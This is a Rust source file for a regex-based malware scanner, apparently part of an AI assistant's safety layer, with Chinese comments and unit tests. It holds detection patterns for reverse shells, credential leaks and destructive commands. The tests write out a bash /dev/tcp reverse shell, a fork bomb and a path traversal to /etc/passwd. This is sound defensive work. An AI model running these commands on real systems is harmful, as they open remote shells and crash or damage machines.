//! L2 分层安全扫描：静态代码/内容恶意模式扫描
//!
//! 对标 `capabilities.rs` 中的 `sec.malware`（恶意代码扫描，Exclusive 能力）。
//! 这是 Marguerite 相比 标准 AI 助手 的差异化内核之一——在生成或执行代码前，
//! 对内容进行离线、确定性、可审计的启发式扫描，而非盲目信任模型输出。
//!
//! 设计原则：
//! - 纯静态、零外部依赖、不调 LLM，可在无 API Key 环境运行。
//! - 规则为确定性正则，命中即报告，附带行号与代码片段，便于审计。
//! - 严重度分级 + 风险分累加，任一 `Critical` 或累计超阈值即 `blocked`。

use regex::Regex;
use serde::{Deserialize, Serialize};

/// 扫描发现的严重度
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum Severity {
    Low = 1,
    Medium = 2,
    High = 3,
    Critical = 4,
}

impl Severity {
    /// 该严重度对应的风险权重
    pub fn weight(&self) -> u32 {
        match self {
            Severity::Low => 2,
            Severity::Medium => 10,
            Severity::High => 40,
            Severity::Critical => 100,
        }
    }

    pub fn as_str(&self) -> &'static str {
        match self {
            Severity::Low => "low",
            Severity::Medium => "medium",
            Severity::High => "high",
            Severity::Critical => "critical",
        }
    }
}

/// 恶意模式类别
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ScanCategory {
    DynamicExecution,
    CodeInjection,
    ReverseShell,
    CredentialLeak,
    DestructiveOp,
    UnsafeDeserialization,
    PathTraversal,
}

impl ScanCategory {
    pub fn as_str(&self) -> &'static str {
        match self {
            ScanCategory::DynamicExecution => "dynamic_execution",
            ScanCategory::CodeInjection => "code_injection",
            ScanCategory::ReverseShell => "reverse_shell",
            ScanCategory::CredentialLeak => "credential_leak",
            ScanCategory::DestructiveOp => "destructive_op",
            ScanCategory::UnsafeDeserialization => "unsafe_deserialization",
            ScanCategory::PathTraversal => "path_traversal",
        }
    }
}

/// 单条扫描规则
#[derive(Debug, Clone)]
struct ScanRule {
    id: &'static str,
    category: ScanCategory,
    severity: Severity,
    pattern: Regex,
    message: &'static str,
}

/// 一条扫描发现
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanFinding {
    pub rule_id: String,
    pub category: ScanCategory,
    pub severity: Severity,
    pub line: usize,
    pub snippet: String,
    pub message: String,
}

/// 扫描报告
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ScanReport {
    pub findings: Vec<ScanFinding>,
    pub risk_score: u32,
    pub blocked: bool,
}

impl ScanReport {
    /// 是否存在指定严重度及以上的发现
    pub fn has_severity_at_least(&self, sev: Severity) -> bool {
        self.findings.iter().any(|f| f.severity >= sev)
    }

    /// 按严重度过滤发现
    pub fn findings_of(&self, sev: Severity) -> Vec<&ScanFinding> {
        self.findings.iter().filter(|f| f.severity == sev).collect()
    }
}

/// L2 恶意代码扫描器
#[derive(Debug, Clone, Default)]
pub struct MalwareScanner {
    rules: Vec<ScanRule>,
}

impl MalwareScanner {
    /// 构造默认扫描器（内置高危模式集）
    pub fn new() -> Self {
        // 每条规则：id / 类别 / 严重度 / 正则 / 审计信息
        // 注意：正则仅匹配"代码中出现的危险模式"，不解析语义，属启发式。
        let builtin: &[(
            &'static str,
            ScanCategory,
            Severity,
            &'static str,
            &'static str,
        )] = &[
            // —— 动态执行（最危险，可任意执行字符串代码）——
            (
                "L2-EVAL",
                ScanCategory::DynamicExecution,
                Severity::Critical,
                r"(?i)\beval\s*\(",
                "代码中出现动态 eval 执行，可任意运行构造的字符串",
            ),
            (
                "L2-EXEC",
                ScanCategory::DynamicExecution,
                Severity::Critical,
                r#"(?i)\bexec\s*\(\s*(?:[`'\"]|[^)]*\+)"#,
                "代码中出现动态 exec 执行，可能执行受控命令",
            ),
            (
                "L2-OS-SYSTEM",
                ScanCategory::DynamicExecution,
                Severity::High,
                r"(?i)\bos\.system\s*\(",
                "直接调用 os.system 执行 shell，易命令注入",
            ),
            // —— 代码注入 / 进程生成 ——
            (
                "L2-SUBPROCESS-SHELL",
                ScanCategory::CodeInjection,
                Severity::High,
                r"(?i)\bsubprocess\.(?:call|run|Popen)\s*\([^)]*shell\s*=\s*True",
                "以 shell=True 启动子进程，易命令注入",
            ),
            (
                "L2-FUNCTION-CTOR",
                ScanCategory::CodeInjection,
                Severity::High,
                r"(?i)\bnew\s+Function\s*\(",
                "使用 Function 构造器动态编译代码，属代码注入风险",
            ),
            // —— 反向 shell / 远程控制 ——
            (
                "L2-DEV-TCP",
                ScanCategory::ReverseShell,
                Severity::Critical,
                r"/dev/tcp/",
                "出现 /dev/tcp/ 设备重定向，典型 bash 反向 shell",
            ),
            (
                "L2-NC-E",
                ScanCategory::ReverseShell,
                Severity::Critical,
                r"(?i)\bnc\b[^\n]*\s-e\b",
                "netcat -e 反弹 shell 模式",
            ),
            (
                "L2-BASH-I",
                ScanCategory::ReverseShell,
                Severity::High,
                r"(?i)\bbash\s+-i\b",
                "交互式 bash，常见于反向 shell 建立",
            ),
            (
                "L2-MKFIFO",
                ScanCategory::ReverseShell,
                Severity::High,
                r"(?i)\bmkfifo\b",
                "mkfifo 命名管道，常配合反向 shell",
            ),
            // —— 凭证泄露 ——
            (
                "L2-AWS-KEY",
                ScanCategory::CredentialLeak,
                Severity::Critical,
                r"AKIA[0-9A-Z]{16}",
                "硬编码 AWS Access Key ID，凭证泄露",
            ),
            (
                "L2-PRIV-KEY",
                ScanCategory::CredentialLeak,
                Severity::Critical,
                r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----",
                "硬编码私钥，严重凭证泄露",
            ),
            (
                "L2-HARDCODED-PASS",
                ScanCategory::CredentialLeak,
                Severity::Medium,
                r#"(?i)(?:password|passwd|secret|api[_-]?key|token)\s*[:=]\s*["'][^"'{$\s]{6,}["']"#,
                "疑似硬编码明文凭证/密钥",
            ),
            // —— 破坏性操作 ——
            (
                "L2-RM-RF",
                ScanCategory::DestructiveOp,
                Severity::High,
                r"(?i)\brm\s+-[a-z]*rf\b",
                "递归强制删除，破坏性操作",
            ),
            (
                "L2-FORK-BOMB",
                ScanCategory::DestructiveOp,
                Severity::Critical,
                r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}",
                "分叉炸弹（fork bomb）模式",
            ),
            (
                "L2-SHUTDOWN",
                ScanCategory::DestructiveOp,
                Severity::High,
                r"(?i)\b(?:shutdown|reboot|halt|poweroff)\b",
                "系统电源级操作，破坏性",
            ),
            // —— 不安全反序列化 ——
            (
                "L2-PICKLE",
                ScanCategory::UnsafeDeserialization,
                Severity::High,
                r"(?i)\bpickle\.(?:loads|load)\s*\(",
                "Python pickle 反序列化，可任意代码执行",
            ),
            (
                "L2-YAML-LOAD",
                ScanCategory::UnsafeDeserialization,
                Severity::Medium,
                r"(?i)\byaml\.load\s*\(",
                "PyYAML yaml.load 默认反序列化不安全，应使用 yaml.safe_load 显式指定 Loader",
            ),
            (
                "L2-UNSERIALIZE",
                ScanCategory::UnsafeDeserialization,
                Severity::Medium,
                r"(?i)\bunserialize\s*\(",
                "PHP unserialize，不安全反序列化",
            ),
            // —— 路径穿越 ——
            (
                "L2-TRAVERSAL",
                ScanCategory::PathTraversal,
                Severity::Medium,
                r"(?:\.\./|\.\.\\){2,}",
                "出现多次路径穿越序列，可能越界访问",
            ),
        ];

        let rules = builtin
            .iter()
            .map(|(id, cat, sev, pat, msg)| ScanRule {
                id,
                category: *cat,
                severity: *sev,
                pattern: Regex::new(pat).expect("valid builtin regex"),
                message: msg,
            })
            .collect();

        Self { rules }
    }

    /// 追加自定义规则（项目级补充）
    pub fn with_rule(
        mut self,
        id: &'static str,
        category: ScanCategory,
        severity: Severity,
        pattern: &str,
        message: &'static str,
    ) -> Self {
        if let Ok(re) = Regex::new(pattern) {
            self.rules.push(ScanRule {
                id,
                category,
                severity,
                pattern: re,
                message,
            });
        }
        self
    }

    /// 扫描一段文本（如生成的代码/文件内容），返回报告
    pub fn scan_text(&self, content: &str) -> ScanReport {
        let mut findings = Vec::new();
        for (idx, line) in content.lines().enumerate() {
            let line_no = idx + 1;
            for rule in &self.rules {
                if rule.pattern.is_match(line) {
                    findings.push(ScanFinding {
                        rule_id: rule.id.to_string(),
                        category: rule.category,
                        severity: rule.severity,
                        line: line_no,
                        snippet: line.trim().to_string(),
                        message: rule.message.to_string(),
                    });
                }
            }
        }
        Self::build_report(findings)
    }

    /// 扫描文件内容（读取后委托 scan_text）
    pub fn scan_file(&self, path: &std::path::Path) -> std::io::Result<ScanReport> {
        let content = std::fs::read_to_string(path)?;
        Ok(self.scan_text(&content))
    }

    fn build_report(mut findings: Vec<ScanFinding>) -> ScanReport {
        // 同一行同规则去重（避免重复计数）
        findings.sort_by(|a, b| a.line.cmp(&b.line).then(a.rule_id.cmp(&b.rule_id)));
        findings.dedup_by(|a, b| a.line == b.line && a.rule_id == b.rule_id);

        let risk_score: u32 = findings.iter().map(|f| f.severity.weight()).sum();
        // 任一 Critical，或累计风险分超过阈值（120），即阻断
        let blocked =
            findings.iter().any(|f| f.severity == Severity::Critical) || risk_score >= 120;
        ScanReport {
            findings,
            risk_score,
            blocked,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn s() -> MalwareScanner {
        MalwareScanner::new()
    }

    #[test]
    fn detects_eval_as_critical() {
        let r = s().scan_text("result = eval(user_input)\n");
        assert!(r.blocked, "eval 应触发 blocked");
        assert!(r.has_severity_at_least(Severity::Critical));
        assert!(r.findings.iter().any(|f| f.rule_id == "L2-EVAL"));
        assert_eq!(r.findings[0].line, 1);
    }

    #[test]
    fn detects_aws_key_and_private_key() {
        let code = "key = \"AKIAIOSFODNN7EXAMPLE\"\n-----BEGIN RSA PRIVATE KEY-----\nMII=";
        let r = s().scan_text(code);
        assert!(r.findings.iter().any(|f| f.rule_id == "L2-AWS-KEY"));
        assert!(r.findings.iter().any(|f| f.rule_id == "L2-PRIV-KEY"));
        assert!(r.blocked);
    }

    #[test]
    fn detects_reverse_shell_patterns() {
        let r = s().scan_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
        assert!(r.findings.iter().any(|f| f.rule_id == "L2-DEV-TCP"));
        assert!(r.findings.iter().any(|f| f.rule_id == "L2-BASH-I"));
    }

    #[test]
    fn detects_subprocess_shell_true() {
        let r = s().scan_text("subprocess.run(cmd, shell=True)\n");
        assert!(r
            .findings
            .iter()
            .any(|f| f.rule_id == "L2-SUBPROCESS-SHELL"));
    }

    #[test]
    fn detects_fork_bomb() {
        let r = s().scan_text(":(){ :|:& };:\n");
        assert!(r.findings.iter().any(|f| f.rule_id == "L2-FORK-BOMB"));
        assert!(r.blocked);
    }

    #[test]
    fn detects_pickle_and_traversal() {
        let code = "data = pickle.loads(blob)\npath = '../../../etc/passwd'\n";
        let r = s().scan_text(code);
        assert!(r.findings.iter().any(|f| f.rule_id == "L2-PICKLE"));
        assert!(r.findings.iter().any(|f| f.rule_id == "L2-TRAVERSAL"));
    }

    #[test]
    fn benign_code_passes() {
        let code = "def add(a, b):\n    return a + b\n\nresult = add(1, 2)\nprint(result)\n";
        let r = s().scan_text(code);
        assert!(!r.blocked, "纯计算代码不应被阻断");
        assert!(r.findings.is_empty(), "不应有发现: {:?}", r.findings);
        assert_eq!(r.risk_score, 0);
    }

    #[test]
    fn risk_score_accumulates() {
        // 三个 medium（各 10 分）= 30，未达 120 阈值，不触发 blocked
        let code = "password = 'hunter2'\nyaml.load(s)\nfoo = '../../../x'\n";
        let r = s().scan_text(code);
        assert!(!r.blocked, "30 分未达 120 阈值，不应阻断");
        assert_eq!(r.risk_score, 30);
    }

    #[test]
    fn threshold_block_when_accumulated() {
        // 构造大量 medium 命中触发累计阈值（每条硬编码凭证 = 10 分）
        let mut code = String::new();
        for i in 0..15 {
            code.push_str(&format!("password = 'secret{:0>6}'\n", i));
        }
        let r = s().scan_text(&code);
        // 15 * 10 = 150 >= 120 → blocked
        assert!(r.blocked, "累计 {} 应触发阈值阻断", r.risk_score);
    }

    #[test]
    fn custom_rule_appends() {
        let scanner = s().with_rule(
            "L2-CUSTOM",
            ScanCategory::CodeInjection,
            Severity::High,
            r"(?i)\bDANGEROUS_API\b",
            "自定义危险 API",
        );
        let r = scanner.scan_text("call DANGEROUS_API()\n");
        assert!(r.findings.iter().any(|f| f.rule_id == "L2-CUSTOM"));
    }

    #[test]
    fn severity_weight_monotonic() {
        assert!(Severity::Critical.weight() > Severity::High.weight());
        assert!(Severity::High.weight() > Severity::Medium.weight());
        assert!(Severity::Medium.weight() > Severity::Low.weight());
    }
}
